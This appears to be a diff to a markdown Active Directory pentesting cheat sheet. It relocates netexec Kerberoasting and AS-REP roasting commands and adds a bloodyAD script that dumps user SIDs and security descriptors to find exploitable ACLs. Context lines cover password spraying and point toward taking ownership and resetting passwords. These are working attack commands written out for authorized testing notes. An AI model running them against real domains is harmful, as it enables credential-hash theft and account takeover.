@@ -121,6 +121,19 @@ For a specific user, inspect recursive group membership:
 bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP get membership "<user>"
 ```
 
+## Kerberoast with valid credentials
+
+```bash
+netexec ldap $DC_IP -u "$USER" -p "$PASS" --kerberoasting kerberoast.txt
+```
+
+## AS-REP roast with valid credentials
+
+```bash
+netexec ldap $DC_IP -u "$USER" -p "$PASS" --asreproast asrep.txt
+```
+
+
 ### If LDAP bind or collection fails
 1. sync time again
 2. verify the creds against SMB on the DC
@@ -179,22 +192,53 @@ netexec smb hosts.txt -u users.txt -p "$PASS" --continue-on-success
 netexec winrm hosts.txt -u users.txt -p "$PASS" --continue-on-success
 ```
 
-## Kerberoast with valid credentials
-
-```bash
-netexec ldap $DC_IP -u "$USER" -p "$PASS" --kerberoasting kerberoast.txt
-```
-
-## AS-REP roast with valid credentials
-
-```bash
-netexec ldap $DC_IP -u "$USER" -p "$PASS" --asreproast asrep.txt
-```
-
 ## Check writable AD objects
 
 ```bash
 bloodyad -d "$DOMAIN" -u "$USER" -p "$PASS" --host $DC_IP get writable --detail
+```
+
+## Check all Security Descriptors for user SIDs
+```
+rm -rf sd
+mkdir -p sd
+
+# Enumerate all users
+bloodyad -H "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASS" get search \
+  --filter '(&(objectCategory=person)(objectClass=user))' \
+  --attr 'sAMAccountName,objectSid,distinguishedName' > users.txt
+
+# SID-only patterns for rg
+awk -F': ' '/^objectSid:/ {print $2}' users.txt | sort -u > sid.txt
+
+# SID -> username -> DN reference
+awk -F': ' '
+/^distinguishedName:/ {
+    if (dn != "" && sid != "")
+        print sid "\t" user "\t" dn
+    dn=$2
+    sid=""
+    user=""
+}
+/^sAMAccountName:/ {user=$2}
+/^objectSid:/ {sid=$2}
+END {
+    if (dn != "" && sid != "")
+        print sid "\t" user "\t" dn
+}
+' users.txt > sid-reference.txt
+
+# Enumerate security descriptors / ACLs for all AD objects
+bloodyad -H "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASS" get search \
+  --filter '(objectClass=*)' \
+  --attr 'distinguishedName,nTSecurityDescriptor' \
+  --resolve-sd > sd/all.txt
+
+# Find ACLs containing any user SID
+rg -n -B 40 -A 5 --fixed-strings --file sid.txt sd/all.txt
+
+# View SID -> user -> DN mapping when needed
+column -t -s $'\t' sid-reference.txt
 ```
 
 ## Take ownership, grant rights, then reset password
